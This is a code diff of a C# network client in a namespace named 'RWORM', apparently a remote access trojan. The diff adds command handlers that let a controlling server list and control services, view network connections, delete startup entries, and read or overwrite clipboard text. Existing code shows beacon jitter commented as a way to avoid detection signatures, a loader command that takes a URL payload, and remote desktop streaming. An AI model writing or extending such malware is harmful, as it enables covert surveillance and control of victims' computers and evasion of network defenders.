@@ -238,9 +238,12 @@ namespace RWORM.Client.Network
 
 
 
-                // Smart Jitter: apply +/- 25% random variation to avoid periodic beacon signatures
-                int jitterMs = Random.Shared.Next((int)(delay * 0.75), (int)(delay * 1.25) + 1);
-                try { await Task.Delay(jitterMs, _cts.Token).ConfigureAwait(false); }
+                // Smart Jitter: apply +/- 25% random variation to avoid periodic beacon signatures
+
+                int jitterMs = Random.Shared.Next((int)(delay * 0.75), (int)(delay * 1.25) + 1);
+
+                try { await Task.Delay(jitterMs, _cts.Token).ConfigureAwait(false); }
+
 
                 catch (OperationCanceledException) { break; }
 
@@ -760,11 +763,16 @@ namespace RWORM.Client.Network
 
                 // ── Loader ─────────────────────────────────────────────────
 
-                // ── System Metrics ─────────────────────────────────────────
-                case 0x55: // METRICS_REQ
-                    await SendAsync(CreatePacket(0x56, 0, SysMetrics.GetMetricsJson()));
-                    break;
-
+                // ── System Metrics ─────────────────────────────────────────
+
+                case 0x55: // METRICS_REQ
+
+                    await SendAsync(CreatePacket(0x56, 0, SysMetrics.GetMetricsJson()));
+
+                    break;
+
+
+
                 case 0x70: // LOADER_EXEC — payload = URL
 
                     await SendAsync(CreatePacket(0x71, 0,
@@ -777,25 +785,81 @@ namespace RWORM.Client.Network
 
                 // ── Remote Desktop ─────────────────────────────────────────
 
-                case 0x80: // RD_START — payload = optional monitor index
-                {
-                    int monIdx = 0;
-                    if (payload.Length > 0 && int.TryParse(txt(), out int parsedIdx))
-                        monIdx = parsedIdx;
-                    _remoteDesktop?.Stop();
-                    _remoteDesktop = new RemoteDesktop
-                    {
-                        Fps          = 10,
-                        Quality      = 35,
-                        MonitorIndex = monIdx,
-                        OnFrame      = async frame => await SendAsync(CreatePacket(0x81, 0, frame))
-                    };
-                    _remoteDesktop.Start();
-                    break;
-                }
-                case 0x84: // RD_MONITORS_REQ
-                    await SendAsync(CreatePacket(0x85, 0, RemoteDesktop.GetMonitorsJson()));
-                    break;
+                case 0x80: // RD_START — payload = optional monitor index
+
+                {
+
+                    int monIdx = 0;
+
+                    if (payload.Length > 0 && int.TryParse(txt(), out int parsedIdx))
+
+                        monIdx = parsedIdx;
+
+                    _remoteDesktop?.Stop();
+
+                    _remoteDesktop = new RemoteDesktop
+
+                    {
+
+                        Fps          = 10,
+
+                        Quality      = 35,
+
+                        MonitorIndex = monIdx,
+
+                        OnFrame      = async frame => await SendAsync(CreatePacket(0x81, 0, frame))
+
+                    };
+
+                    _remoteDesktop.Start();
+
+                    break;
+
+                }
+
+                // ── Service Manager ─────────────────────────────────────────
+                case 0xC0: // SERVICES_LIST_REQ
+                    await SendAsync(CreatePacket(0xC1, 0, ServiceManager.ListServices()));
+                    break;
+                case 0xC2: // SERVICE_CTRL_REQ — payload = "name\x00action"
+                {
+                    var parts = txt().Split('\x00');
+                    if (parts.Length >= 2)
+                        await SendAsync(CreatePacket(0xC3, 0, ServiceManager.ControlService(parts[0], parts[1])));
+                    break;
+                }
+
+                // ── Net Monitor ─────────────────────────────────────────────
+                case 0xC4: // NET_LIST_REQ
+                    await SendAsync(CreatePacket(0xC5, 0, NetMonitor.ListConnections()));
+                    break;
+
+                // ── Autorun / Startup ───────────────────────────────────────
+                case 0xC6: // STARTUP_LIST_REQ
+                    await SendAsync(CreatePacket(0xC7, 0, AutorunManager.ListStartupEntries()));
+                    break;
+                case 0xC8: // STARTUP_DEL_REQ — payload = "scope\x00name\x00location"
+                {
+                    var parts = txt().Split('\x00');
+                    if (parts.Length >= 3)
+                        await SendAsync(CreatePacket(0xC9, 0, AutorunManager.DeleteStartupEntry(parts[0], parts[1], parts[2])));
+                    break;
+                }
+
+                // ── Clipboard ───────────────────────────────────────────────
+                case 0xCA: // CLIPBOARD_GET_REQ
+                    await SendAsync(CreatePacket(0xCB, 0, ClipboardManager.GetClipboardText()));
+                    break;
+                case 0xCC: // CLIPBOARD_SET_REQ — payload = newText
+                    await SendAsync(CreatePacket(0xCD, 0, ClipboardManager.SetClipboardText(txt())));
+                    break;
+
+                case 0x84: // RD_MONITORS_REQ
+
+                    await SendAsync(CreatePacket(0x85, 0, RemoteDesktop.GetMonitorsJson()));
+
+                    break;
+
                 case 0x83: // RD_STOP
 
                     _remoteDesktop?.Stop();
